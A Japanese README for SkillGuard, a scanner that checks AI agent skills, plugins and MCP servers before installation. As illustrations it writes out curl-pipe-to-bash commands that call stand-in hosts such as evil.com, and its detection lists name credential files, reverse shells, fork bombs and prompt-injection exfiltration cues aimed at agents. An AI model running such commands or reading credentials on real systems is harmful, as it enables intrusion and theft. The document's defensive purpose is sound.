# SkillGuard

> **"Agent skills are executable supply chains. Trust nothing you install."**
>
> エージェントスキルは実行可能なサプライチェーンです。インストールするものを盲目的に信頼してはいけません。

---

## SkillGuardとは

SkillGuardは、**AIエージェントのSkill・Plugin・MCPサーバー・依存関係**を、インストール前にセキュリティチェックするツールです。

単なるスキャナーではなく、「**Skill Admission Controller**」として設計されています。
脅威を検知するだけでなく、リスクに応じて**導入可否を自動判定**します。

### なぜ必要なのか

```
installするだけで侵入される時代
```

AIエージェント（Claude Code、Cowork など）は、スキルやプラグインをダウンロードして実行します。
その際、以下のような攻撃が仕掛けられる可能性があります：

| 攻撃手法 | 具体例 |
|---------|--------|
| インストール時リモートコード実行 | `curl https://evil.com/payload.sh \| bash` |
| Pythonパス汚染（永続化） | `.pth` ファイルによるコード注入 |
| 認証情報窃取 | `~/.aws/credentials`、`~/.ssh/id_rsa`、`/etc/passwd` の読み取りと外部送信 |
| サプライチェーン攻撃 | タイポスクワッティング、バージョン未固定の依存関係 |
| MCPサーバー悪用 | `autoApprove: ["*"]`、無制限シェルアクセス |
| 難読化ペイロード | base64・hex・ROT13でエンコードされたコマンド |
| プロンプトインジェクション | プロンプト内の `exfiltrate`・`send this to` 指示による情報流出 |
| ステルス通信 | IP直指定接続（DNS迂回）、C2ビーコン |

---

## クイックスタート

### インストール

```bash
pip install skillguard-ai
```

ローカルにクローンした場合：

```bash
git clone https://github.com/tyr0x9/skillguard-ai.git
cd skillguard-ai
pip install .
```

### スキャン実行

```bash
# ローカルディレクトリをスキャン
skillguard scan ./my-skill/

# 単一ファイルをスキャン
skillguard scan ./install.sh

# GitHubリポジトリをスキャン
skillguard scan github:owner/repo
```

### 出力例

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  SkillGuard Security Scan Report
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Target:   ./my-skill/
Score:    0/100
Decision: BLOCK

Execution Surface: install, hook
Capabilities:      shell, network
Asset Exposure:    credential

Findings (3):
  [CRITICAL] exec_curl_pipe_sh
    Title: curl piped to shell
    File:  install.sh:5
    Match: curl https://evil-server.com/payload.sh | bash
    Info:  リモートスクリプトのダウンロードと実行はサプライチェーン攻撃の典型的な手法です。

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BLOCKED - 深刻なセキュリティ問題が検出されました。インストールしないでください。
```

---

## リスクスコアリング

スコアは100点からスタートし、検出された問題の深刻度に応じて減点されます。

| 深刻度 | 減点 | 例 |
|--------|------|-----|
| CRITICAL | -40 | `curl \| bash`、認証情報の外部送信 |
| HIGH | -20 | crontabによる永続化、リバースシェル |
| MEDIUM | -10 | バージョン未固定の依存関係、疑わしいMCP設定 |
| LOW | -5 | 軽微な設定ミス |

**判定基準：**

```
スコア 80以上 → PASS   (安全)
スコア 50〜79 → REVIEW (要確認)
スコア 50未満 → BLOCK  (ブロック)
```

スコアに関わらず、以下の危険な組み合わせが検出された場合は**自動的にBLOCK**になります：

- `インストール時 + シェル実行 + 認証情報アクセス` → **強制BLOCK**
- `フック実行 + ネットワーク送信 + シークレット` → **強制BLOCK**

---

## モード説明

| モード | 動作 | CIでの用途 |
|--------|------|------------|
| `report`（デフォルト） | 結果を表示するだけ、常に終了コード0 | 導入初期・様子見 |
| `warn` | REVIEW→終了コード1、BLOCK→終了コード2 | 通常運用 |
| `enforce` | warnと同じだが、より厳格なメッセージ | 本番環境・厳格運用 |

```bash
# デフォルト（結果表示のみ、CIは失敗しない）
skillguard scan . --mode report

# 問題があればCIを失敗させる
skillguard scan . --mode warn

# 厳格モード（本番環境向け）
skillguard scan . --mode enforce

# 閾値のカスタマイズ（デフォルトはPASS=80、REVIEW=50）
skillguard scan . --mode enforce --threshold 70
```

**終了コード：**

| 判定 | 終了コード |
|------|-----------|
| PASS | `0` |
| REVIEW | `1`（warn/enforceモード） |
| BLOCK | `2`（warn/enforceモード） |

---

## 検出ルール（120種類以上）

9つのカテゴリで120種類以上のルールを実装しています。
さらに**相関分析**により単発では検出できない複合的な攻撃パターンも検知します。

### 実行系（20種類）
`curl|bash`、`wget|sh`、`base64 -d | bash`、`os.system()`、`eval()`、`subprocess shell=True`、PowerShellエンコードコマンド、`importlib.import_module()` 変数引数、`__import__()`、`getattr()` 動的呼び出し、`subprocess` + `rm -rf`/`nc`/`dd` などの危険コマンド など

### 永続化（10種類）
`.pth`ファイル注入、`sitecustomize.py`改ざん、`crontab`変更、`systemd`サービス登録、`.bashrc`改ざん、gitフック汚染 など

### 認証情報アクセス（32種類）
`~/.aws/credentials`、`~/.ssh/id_rsa`、`.env`ファイル、`kubeconfig`、GCPサービスアカウント、ブラウザCookieストレージ、各種APIキーのハードコード、**`/etc/passwd`・`/etc/shadow`**、**`/proc/*/environ`**（プロセス環境変数ダンプ）、**SSH host key**・`known_hosts` など

### ネットワーク・情報漏洩（17種類）
外部へのPOST送信、rawソケット、リバースシェル、ngrokトンネル、pastebin送信、C2ビーコンパターン、**IP直指定接続**（DNS迂回）、**`print(os.environ...)`等のセンシティブデータ出力経路** など

### プロンプト・LLMリスク（4種類）
**プロンプト文字列内の流出キーワード**（`exfiltrate`・`send this to`・`upload`）、センシティブデータ収集指示、**read→send チェーン記述**、`return os.environ` 等の出力経路 など

### サプライチェーン（14種類）
バージョン未固定の依存関係、ロックファイル欠如、カスタムPyPI/npmレジストリ、タイポスクワッティングパターン、git+URLによる依存関係 など

### MCP・エージェントリスク（9種類）
`autoApprove: ["*"]`、`trust: all`、無制限シェルMCP、システムディレクトリへの書き込み権限、自動実行設定 など

### 難読化（11種類）
base64エンコードペイロード、16進数コマンド、`eval(atob(...))`、`compile()` + `exec()`、文字コード連結 など

### 破壊的操作（7種類）
`rm -rf /`、フォーク爆弾、ディスクワイプ、`DROP DATABASE`、`shred -u` など

---

### 相関分析（9パターン）

単発では検出が難しい**複合攻撃パターン**を自動検知します。

| 相関パターン | 判定 | 意味 |
|-------------|------|------|
| 認証情報読み取り + ネットワーク送信 | CRITICAL | 認証情報の外部流出 |
| 環境変数アクセス + ネットワーク送信 | CRITICAL | APIキー等の流出 |
| eval/exec + ネットワーク | CRITICAL | リモートコード実行チェーン |
| 難読化 + ネットワーク | CRITICAL | 隠蔽された流出 |
| 永続化 + ネットワーク | CRITICAL | C2コールバック型バックドア |
| base64 + ネットワーク送信 | CRITICAL | エンコード流出 |
| 危険subprocess + 環境変数 | CRITICAL | 環境対応型破壊・バックドア |
| プロンプト流出指示 + ネットワーク | CRITICAL | プロンプトインジェクション実行 |
| IP直指定 + センシティブファイル読み取り | CRITICAL | ステルス認証情報流出 |

---

## 許可リスト（Allowlist）

既知の安全なパターンは許可リストに登録できます。

### プロジェクトルートに `.skillguard.yaml` を作成

```yaml
# 特定ルールをグローバルに無視
ignore_rules:
  - sc_requirements_no_hash
  - sc_npm_unpinned

# 特定ファイルをスキャン対象外に
ignore_files:
  - test_install.sh

# 特定ディレクトリをスキャン対象外に
ignore_paths:
  - tests/
  - fixtures/
```

### インラインコメントで行単位に無視

```bash
# 既知の安全なパターンを1行だけ無視する
curl https://raw.githubusercontent.com/pypa/pip/main/get-pip.py | python  # skillguard:ignore exec_curl_pipe_sh
```

---

## CI連携

### GitHub Actions

PRのたびに自動でスキャンを実行します。`.github/workflows/skillguard.yml` を作成してください：

```yaml
name: SkillGuard Security Scan
on:
  pull_request:
    branches: [main, master]
  push:
    branches: [main, master]

jobs:
  skillguard:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: SkillGuardをインストール
        run: pip install skillguard-ai

      - name: セキュリティスキャン実行
        run: skillguard scan . --mode warn --format json > skillguard-report.json

      - name: レポートをアーティファクトとして保存
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: skillguard-report
          path: skillguard-report.json
```

**enforceモードに切り替える場合：**

```yaml
# --mode warn → --mode enforce に変更するだけ
run: skillguard scan . --mode enforce
```

### pre-commit フック

```yaml
# .pre-commit-config.yaml
repos:
  - repo: local
    hooks:
      - id: skillguard
        name: SkillGuard Security Scan
        entry: skillguard scan . --mode enforce
        language: system
        pass_filenames: false
```

---

## JSON出力

機械処理やダッシュボード連携向けにJSON形式で出力できます。

```bash
skillguard scan . --format json
skillguard scan . --format json | jq '.decision'
skillguard scan . --format json | jq '.findings[].severity'
```

```json
{
  "target": "./my-skill/",
  "score": 0,
  "decision": "BLOCK",
  "findings": [
    {
      "rule_id": "exec_curl_pipe_sh",
      "title": "curl piped to shell",
      "severity": "CRITICAL",
      "file_path": "install.sh",
      "line_number": 5,
      "matched_text": "curl https://evil-server.com/payload.sh | bash"
    }
  ],
  "execution_surfaces": ["install", "hook"],
  "capabilities": ["shell", "network"],
  "asset_exposure": ["credential"],
  "scanned_files": ["install.sh", "requirements.txt"],
  "sbom": {
    "packages": [
      {"name": "requests", "version": "2.31.0", "ecosystem": "pip"}
    ]
  },
  "duration_seconds": 0.09
}
```

---

## サンプルファイル

動作確認用のサンプルが `samples/` ディレクトリに含まれています。

```bash
# 安全なスキル → PASS (100/100)
skillguard scan samples/benign/

# curl|bash 攻撃 → BLOCK (0/100)
skillguard scan samples/curl_sh/

# 認証情報窃取 → BLOCK (0/100)
skillguard scan samples/credential_steal/

# フォーク爆弾 → REVIEW (60/100)
skillguard scan samples/fork_bomb/

# .pthファイル注入 → REVIEW (60/100)
skillguard scan samples/pth_attack/
```

---

## カスタムルールの追加

`rules/` ディレクトリにYAMLファイルを追加するだけで、独自ルールを定義できます。

```yaml
rules:
  - id: my_custom_rule
    title: "カスタム検出ルール"
    description: "このルールが検出する内容と、なぜ危険なのかを記述"
    category: execution
    severity: HIGH          # CRITICAL / HIGH / MEDIUM / LOW / INFO
    file_patterns:
      - "*.sh"
      - "*.py"
    patterns:
      - "危険なパターンの正規表現"
    execution_surface: [install]   # install / hook / runtime / manual
    capabilities: [shell]          # shell / network / filesystem / process
    asset_reach: []                # credential / secret / key / config
```

---

## 動作要件

- Python 3.9 以上
- 依存パッケージ: `click`, `pyyaml`, `rich`
- スキャン時間: 通常5秒以内
- 外部API通信: なし（完全オフライン動作）

---

## 免責事項

**本ツールの使用は自己責任です。**

SkillGuardは静的パターンマッチングによるリスク検出ツールです。以下の点をご理解の上でご利用ください。

- **完全な検出を保証しません。** 動的コード生成・高度な難読化・ゼロデイ手法など、検出できない攻撃手法が存在します。
- **PASS判定は安全の証明ではありません。** 「問題が見つからなかった」という意味であり、「安全である」という意味ではありません。
- **BLOCK/REVIEW判定が常に正しいとは限りません。** false positive（誤検知）が発生する場合があります。最終的な導入判断は利用者自身が行ってください。
- **本ツールの判定結果に基づいて生じたいかなる損害についても、開発者は責任を負いません。**
- セキュリティ上の重要な判断においては、本ツールの結果を補助情報の一つとして扱い、専門家によるレビューと組み合わせることを推奨します。

> SkillGuard is provided "as is", without warranty of any kind.  
> Use it as one layer of defense, not the only one.

---

## ライセンス

MIT License — Copyright (c) 2026 SkillGuard Contributors
